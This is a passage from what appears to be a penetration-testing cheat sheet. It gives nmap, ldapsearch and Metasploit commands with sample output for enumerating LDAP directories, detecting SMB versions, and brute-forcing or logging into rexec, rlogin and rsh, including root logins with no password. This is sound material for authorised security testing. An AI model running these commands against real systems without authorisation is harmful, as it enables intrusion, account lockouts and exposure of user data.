<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Firewall</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FIREFIGHTER</span><span class="o">-</span><span class="n">SEC</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">SmartCenter</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FIREFIGHTER</span><span class="o">-</span><span class="n">MGMT</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Auxiliary</span> <span class="n">module</span> <span class="n">execution</span> <span class="n">completed</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="ldap-port-389">
<h2>LDAP - Port 389<a class="headerlink" href="#ldap-port-389" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id23">
<h3>Nmap<a class="headerlink" href="#id23" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ldap-rootdse">
<h4>LDAP-rootdse<a class="headerlink" href="#ldap-rootdse" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html">ldap-rootdse.nse</a> : Retrieves the LDAP root DSA-specific Entry (DSE)</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>nmap -p 389 --script ldap-rootdse &lt;host&gt;
nmap -p 389 --script ldap-rootdse 172.16.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 23:05 IST
Nmap scan report for 172.16.xx.xx
Host is up (0.015s latency).
PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse:
| LDAP Results
|   &lt;ROOT&gt;
|       currentTime: 20160503173447.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
|       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
|       namingContexts: DC=xxxpcx,DC=com
|       namingContexts: CN=Configuration,DC=xxxpcx,DC=com
|       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
|       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com
|       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com
|       defaultNamingContext: DC=xxxpcx,DC=com
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
|       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com
|       rootDomainNamingContext: DC=xxxpcx,DC=com
|       supportedControl: 1.2.xx.xx.1.4.319
|       supportedControl: 1.2.xx.xx.1.4.801
|       supportedControl: 1.2.xx.xx.1.4.473
|       supportedControl: 1.2.xx.xx.1.4.528
|       supportedControl: 1.2.xx.xx.1.4.417
|       supportedControl: 1.2.xx.xx.1.4.619
|       supportedControl: 1.2.xx.xx.1.4.841
|       supportedControl: 1.2.xx.xx.1.4.529
|       supportedControl: 1.2.xx.xx.1.4.805
|       supportedControl: 1.2.xx.xx.1.4.521
|       supportedControl: 1.2.xx.xx.1.4.970
|       supportedControl: 1.2.xx.xx.1.4.1338
|       supportedControl: 1.2.xx.xx.1.4.474
|       supportedControl: 1.2.xx.xx.1.4.1339
|       supportedControl: 1.2.xx.xx.1.4.1340
|       supportedControl: 1.2.xx.xx.1.4.1413
|       supportedControl: 2.16.xx.xx.113730.3.4.9
|       supportedControl: 2.16.xx.xx.113730.3.4.10
|       supportedControl: 1.2.xx.xx.1.4.1504
|       supportedControl: 1.2.xx.xx.1.4.1852
|       supportedControl: 1.2.xx.xx.1.4.802
|       supportedControl: 1.2.xx.xx.1.4.1907
|         supportedControl: 1.2.xx.xx.1.4.1948
|       supportedControl: 1.2.xx.xx.1.4.1974
|       supportedControl: 1.2.xx.xx.1.4.1341
|       supportedControl: 1.2.xx.xx.1.4.2026
|       supportedControl: 1.2.xx.xx.1.4.2064
|       supportedControl: 1.2.xx.xx.1.4.2065
|       supportedControl: 1.2.xx.xx.1.4.2066
|       supportedControl: 1.2.xx.xx.1.4.2090
|       supportedControl: 1.2.xx.xx.1.4.2205
|       supportedControl: 1.2.xx.xx.1.4.2204
|       supportedControl: 1.2.xx.xx.1.4.2206
|       supportedControl: 1.2.xx.xx.1.4.2211
|       supportedControl: 1.2.xx.xx.1.4.2239
|       supportedControl: 1.2.xx.xx.1.4.2255
|       supportedControl: 1.2.xx.xx.1.4.2256
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 70892
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: SCN-DC01.xxxpcx.com
|       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM
|       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
|       supportedCapabilities: 1.2.xx.xx.1.4.800
|       supportedCapabilities: 1.2.xx.xx.1.4.1670
|       supportedCapabilities: 1.2.xx.xx.1.4.1791
|       supportedCapabilities: 1.2.xx.xx.1.4.1935
|       supportedCapabilities: 1.2.xx.xx.1.4.2080
|       supportedCapabilities: 1.2.xx.xx.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 3
|       forestFunctionality: 3
|_      domainControllerFunctionality: 6

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
</pre></div>
</div>
</div>
<div class="section" id="ldap-search">
<h4>ldap-search<a class="headerlink" href="#ldap-search" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ldap-search.html">ldap-search.nse</a> : Attempts to perform an LDAP search and returns all matches.</p>
<p>If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.</p>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">--</span><span class="n">script</span> <span class="n">ldap</span><span class="o">-</span><span class="n">search</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="s1">&#39;ldap.username=&quot;cn=ldaptest,cn=users,dc=cqure,dc=net&quot;,ldap.password=ldaptest,</span>
<span class="n">ldap</span><span class="o">.</span><span class="n">qfilter</span><span class="o">=</span><span class="n">users</span><span class="p">,</span><span class="n">ldap</span><span class="o">.</span><span class="n">attrib</span><span class="o">=</span><span class="n">sAMAccountName</span><span class="s1">&#39; &lt;host&gt;</span>

<span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">--</span><span class="n">script</span> <span class="n">ldap</span><span class="o">-</span><span class="n">search</span> <span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span> <span class="s1">&#39;ldap.username=&quot;cn=ldaptest,cn=users,dc=cqure,dc=net&quot;,ldap.password=ldaptest,</span>
<span class="n">ldap</span><span class="o">.</span><span class="n">qfilter</span><span class="o">=</span><span class="n">custom</span><span class="p">,</span><span class="n">ldap</span><span class="o">.</span><span class="n">searchattrib</span><span class="o">=</span><span class="s2">&quot;operatingSystem&quot;</span><span class="p">,</span><span class="n">ldap</span><span class="o">.</span><span class="n">searchvalue</span><span class="o">=</span><span class="s2">&quot;Windows *Server*&quot;</span><span class="p">,</span><span class="n">ldap</span><span class="o">.</span><span class="n">attrib</span><span class="o">=</span><span class="p">{</span><span class="n">operatingSystem</span><span class="p">,</span><span class="n">whencreated</span><span class="p">,</span><span class="n">OperatingSystemServicePack</span><span class="p">}</span><span class="s1">&#39; &lt;host&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="ldap-brute">
<h4>ldap-brute<a class="headerlink" href="#ldap-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ldap-brute.html">ldap-brute.nse</a> : Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments. This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceed the amount of allowed tries, accounts will be locked out. This usually happens very quickly.</p>
</div>
</div>
<div class="section" id="id24">
<h3>Other<a class="headerlink" href="#id24" title="Permalink to this headline">¶</a></h3>
<div class="section" id="ldapsearch">
<h4>ldapsearch<a class="headerlink" href="#ldapsearch" title="Permalink to this headline">¶</a></h4>
<p>Anonymous LDAP Binding allows a client to connect and search the directory ( bind and search) without logging in. You do not need to include binddn and bindpasswd.</p>
<p>If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">s</span> <span class="n">base</span> <span class="o">-</span><span class="n">b</span> <span class="s1">&#39;&#39;</span> <span class="s2">&quot;(objectClass=*)&quot;</span> <span class="s2">&quot;*&quot;</span> <span class="o">+</span>
<span class="o">-</span><span class="n">h</span> <span class="n">ldap</span> <span class="n">server</span>
<span class="o">-</span><span class="n">p</span> <span class="n">port</span> <span class="n">of</span> <span class="n">ldap</span>
<span class="o">-</span><span class="n">x</span> <span class="n">simple</span> <span class="n">authentication</span>
<span class="o">-</span><span class="n">b</span> <span class="n">search</span> <span class="n">base</span>
<span class="o">-</span><span class="n">s</span> <span class="n">scope</span> <span class="ow">is</span> <span class="n">defined</span> <span class="k">as</span> <span class="n">base</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">s</span> <span class="n">base</span> <span class="o">-</span><span class="n">b</span> <span class="s1">&#39;&#39;</span> <span class="s2">&quot;(objectClass=*)&quot;</span> <span class="s2">&quot;*&quot;</span> <span class="o">+</span>
<span class="c1"># extended LDIF</span>
<span class="c1">#</span>
<span class="c1"># LDAPv3</span>
<span class="c1"># base &lt;&gt; with scope baseObject</span>
<span class="c1"># filter: (objectClass=*)</span>
<span class="c1"># requesting: * +</span>
<span class="c1">#</span>

<span class="c1">#</span>
<span class="n">dn</span><span class="p">:</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">top</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">OpenLDAProotDSE</span>
<span class="n">structuralObjectClass</span><span class="p">:</span> <span class="n">OpenLDAProotDSE</span>
<span class="n">configContext</span><span class="p">:</span> <span class="n">cn</span><span class="o">=</span><span class="n">config</span>
<span class="n">namingContexts</span><span class="p">:</span> <span class="n">dc</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">com</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">9.1</span><span class="o">.</span><span class="mi">1</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">2.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">113730.3</span><span class="o">.</span><span class="mf">4.18</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">2.16</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">113730.3</span><span class="o">.</span><span class="mf">4.2</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">10.1</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.2</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.4</span><span class="o">.</span><span class="mi">319</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.2</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.334810</span><span class="o">.</span><span class="mf">2.3</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.2</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.3344810</span><span class="o">.</span><span class="mf">2.3</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.13</span><span class="o">.</span><span class="mi">2</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.13</span><span class="o">.</span><span class="mi">1</span>
<span class="n">supportedControl</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.12</span>
<span class="n">supportedExtension</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">11.1</span>
<span class="n">supportedExtension</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">11.3</span>
<span class="n">supportedFeatures</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">1.14</span>
<span class="n">supportedFeatures</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">5.1</span>
<span class="n">supportedFeatures</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">5.2</span>
<span class="n">supportedFeatures</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">5.3</span>
<span class="n">supportedFeatures</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">5.4</span>
<span class="n">supportedFeatures</span><span class="p">:</span> <span class="mf">1.3</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="mf">4.1</span><span class="o">.</span><span class="mf">4203.1</span><span class="o">.</span><span class="mf">5.5</span>
<span class="n">supportedLDAPVersion</span><span class="p">:</span> <span class="mi">3</span>
<span class="n">entryDN</span><span class="p">:</span>
<span class="n">subschemaSubentry</span><span class="p">:</span> <span class="n">cn</span><span class="o">=</span><span class="n">Subschema</span>

<span class="c1"># search result</span>
<span class="n">search</span><span class="p">:</span> <span class="mi">2</span>
<span class="n">result</span><span class="p">:</span> <span class="mi">0</span> <span class="n">Success</span>

<span class="c1"># numResponses: 2</span>
<span class="c1"># numEntries: 1</span>
</pre></div>
</div>
<p>Once you are aware of the base name in the above example &#8220;example.com&#8221; we can query for ldap users etc. by</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">ldapsearch</span> <span class="o">-</span><span class="n">h</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="o">-</span><span class="n">x</span> <span class="o">-</span><span class="n">b</span> <span class="s2">&quot;dc=example,dc=com&quot;</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="c1"># johnsmith, EXAUSERS, People, example.com</span>
<span class="n">dn</span><span class="p">:</span> <span class="n">uid</span><span class="o">=</span><span class="n">johnsmith</span><span class="p">,</span><span class="n">ou</span><span class="o">=</span><span class="n">EXAUSERS</span><span class="p">,</span><span class="n">ou</span><span class="o">=</span><span class="n">People</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">example</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">com</span>
<span class="n">displayName</span><span class="p">:</span> <span class="n">John</span> <span class="n">Smith</span>
<span class="n">ntUserLastLogon</span><span class="p">:</span> <span class="mi">130150432350834365</span>
<span class="n">givenName</span><span class="p">:</span> <span class="n">John</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">top</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">person</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">organizationalperson</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">inetOrgPerson</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">ntUser</span>
<span class="n">objectClass</span><span class="p">:</span> <span class="n">shadowAccount</span>
<span class="n">uid</span><span class="p">:</span> <span class="n">johnsmith</span>
<span class="n">cn</span><span class="p">:</span> <span class="n">John</span> <span class="n">Smith</span>
<span class="n">ntUserCodePage</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">ntUserDomainId</span><span class="p">:</span> <span class="n">johnsmith</span>
<span class="n">ntUserLastLogoff</span><span class="p">:</span> <span class="mi">0</span>
<span class="n">ntUniqueId</span><span class="p">:</span> <span class="mi">75</span><span class="n">ac21092c755e42b2129a224eb328dd</span>
<span class="n">ntUserDeleteAccount</span><span class="p">:</span> <span class="n">true</span>
<span class="n">ntUserAcctExpires</span><span class="p">:</span> <span class="mi">9223372036854775807</span>
<span class="n">sn</span><span class="p">:</span> <span class="n">John</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="index-0">
<p class="first admonition-title">Todo</p>
<p class="last">Things to add in LDAP &#8211; User authentication and Jxplorer</p>
</div>
</div>
</div>
</div>
<div class="section" id="smb-port-445">
<h2>SMB - Port 445<a class="headerlink" href="#smb-port-445" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id25">
<h3>Metasploit<a class="headerlink" href="#id25" title="Permalink to this headline">¶</a></h3>
<div class="section" id="smb-version-detection">
<h4>SMB Version Detection<a class="headerlink" href="#smb-version-detection" title="Permalink to this headline">¶</a></h4>
<p>Provides the operating system version.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_version</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">445</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.87</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">445</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">Windows</span> <span class="mi">7</span> <span class="n">Professional</span> <span class="n">SP1</span> <span class="p">(</span><span class="n">build</span><span class="p">:</span><span class="mi">7601</span><span class="p">)</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="mi">3</span><span class="n">BPC13B0843</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">XXX</span><span class="p">)</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.87</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">445</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">Windows</span> <span class="mi">7</span> <span class="n">Professional</span> <span class="n">SP1</span> <span class="p">(</span><span class="n">build</span><span class="p">:</span><span class="mi">7601</span><span class="p">)</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="mi">3</span><span class="n">BWK14F0040</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">XXX</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="rexec-port-512">
<h2>rexec - Port 512<a class="headerlink" href="#rexec-port-512" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id26">
<h3>Metasploit<a class="headerlink" href="#id26" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rexec-authentication-scanner">
<h4>rexec Authentication Scanner<a class="headerlink" href="#rexec-authentication-scanner" title="Permalink to this headline">¶</a></h4>
<p>Find if there is any open shell.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">rservices</span><span class="o">/</span><span class="n">rexec_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">512</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample output with the username root and empty password:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password &#39;root&#39;:&#39;&#39;
[-] Result: Where are you?
[*] 10.10.xx.xx:512 - Starting rexec sweep
[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password &#39;root&#39;:&#39;&#39;
[*] 10.10.xx.xx:512 - Starting rexec sweep
[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password &#39;root&#39;:&#39;&#39;
[+] 10.10.xx.xx:512, rexec &#39;root&#39; : &#39;&#39;
</pre></div>
</div>
</div>
</div>
<div class="section" id="id27">
<h3>Other<a class="headerlink" href="#id27" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rlogin">
<h4>rlogin<a class="headerlink" href="#rlogin" title="Permalink to this headline">¶</a></h4>
<p>The above can be accessed using</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rlogin</span> <span class="o">&lt;</span><span class="n">ipaddress</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id28">
<h3>Nmap<a class="headerlink" href="#id28" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rexec-brute">
<h4>rexec-brute<a class="headerlink" href="#rexec-brute" title="Permalink to this headline">¶</a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rexec-brute.html">rexec-brute.nse</a> : Performs brute force password auditing against the classic UNIX rexec (remote exec) service.</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">-</span><span class="n">p</span> <span class="mi">512</span> <span class="o">--</span><span class="n">script</span> <span class="n">rexec</span><span class="o">-</span><span class="n">brute</span> <span class="o">&lt;</span><span class="n">ip</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="rlogin-port-513">
<h2>rlogin - Port 513<a class="headerlink" href="#rlogin-port-513" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id29">
<h3>Metasploit<a class="headerlink" href="#id29" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rlogin-authentication-scanner">
<h4>rlogin Authentication Scanner<a class="headerlink" href="#rlogin-authentication-scanner" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">rservices</span><span class="o">/</span><span class="n">rlogin_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">513</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">513</span><span class="p">,</span> <span class="n">rlogin</span> <span class="s1">&#39;root&#39;</span> <span class="kn">from</span> <span class="s1">&#39;root&#39;</span> <span class="k">with</span> <span class="n">no</span> <span class="n">password</span><span class="o">.</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">513</span><span class="p">,</span> <span class="n">rlogin</span> <span class="s1">&#39;root&#39;</span> <span class="kn">from</span> <span class="s1">&#39;root&#39;</span> <span class="k">with</span> <span class="n">no</span> <span class="n">password</span><span class="o">.</span>
</pre></div>
</div>
<div class="admonition note">
<p class="first admonition-title">Note</p>
<p class="last">In a recent engagement just doing the &#8220;rlogin IP&#8221; using the root shell provided me the root shell, where-as few IP address asked for password. Also, One IP for which rexec_login shows failed, was able to login using rlogin.</p>
</div>
<p>Maybe refer: Metasploitable 2 : DOC-1875 document.</p>
</div>
</div>
</div>
<div class="section" id="rsh-port-514">
<h2>RSH - port 514<a class="headerlink" href="#rsh-port-514" title="Permalink to this headline">¶</a></h2>
<div class="section" id="id30">
<h3>Metasploit<a class="headerlink" href="#id30" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rsh-authentication-scanner">
<h4>rsh Authentication Scanner<a class="headerlink" href="#rsh-authentication-scanner" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">rservices</span><span class="o">/</span><span class="n">rsh_login</span>
<span class="n">services</span> <span class="o">-</span><span class="n">p</span> <span class="mi">514</span> <span class="o">-</span><span class="n">u</span> <span class="o">-</span><span class="n">R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">514</span><span class="p">,</span> <span class="n">rsh</span> <span class="s1">&#39;root&#39;</span> <span class="kn">from</span> <span class="s1">&#39;root&#39;</span> <span class="k">with</span> <span class="n">no</span> <span class="n">password</span><span class="o">.</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">514</span> <span class="n">RSH</span> <span class="o">-</span> <span class="n">Attempting</span> <span class="n">rsh</span> <span class="k">with</span> <span class="n">username</span> <span class="s1">&#39;root&#39;</span> <span class="kn">from</span> <span class="s1">&#39;root&#39;</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span><span class="p">:</span><span class="mi">514</span><span class="p">,</span> <span class="n">rsh</span> <span class="s1">&#39;root&#39;</span> <span class="kn">from</span> <span class="s1">&#39;root&#39;</span> <span class="k">with</span> <span class="n">no</span> <span class="n">password</span><span class="o">.</span>
</pre></div>
</div>
</div>
</div>
<div class="section" id="id31">
<h3>Other<a class="headerlink" href="#id31" title="Permalink to this headline">¶</a></h3>
<div class="section" id="rsh">
<h4>rsh<a class="headerlink" href="#rsh" title="Permalink to this headline">¶</a></h4>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">rsh</span> <span class="mf">10.11</span><span class="o">.</span><span class="n">xx</span><span class="o">.</span><span class="n">xx</span> <span class="n">whoami</span>
<span class="n">Integrated</span> <span class="n">PrintNet</span> <span class="n">Enterprise</span>
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="afp-apple-filing-protocol-port-548">
